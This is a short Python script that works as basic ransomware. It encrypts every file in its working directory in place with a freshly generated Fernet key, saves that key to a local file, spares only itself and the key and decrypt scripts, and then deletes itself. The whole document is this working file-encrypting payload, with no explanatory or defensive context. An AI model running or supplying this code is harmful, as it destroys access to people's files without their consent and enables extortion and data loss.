import os
from sys import argv
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if os.path.isfile(file) and file != "encrypt.py" and file != "encryption-key.key" and file != "decrypt.py":
        files.append(file)

key = Fernet.generate_key()

with open("encryption-key.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    with open(file, "rb") as encryption_file:
        contents = encryption_file.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as encryption_file:
        encryption_file.write(encrypted_contents)


os.remove(argv[0])
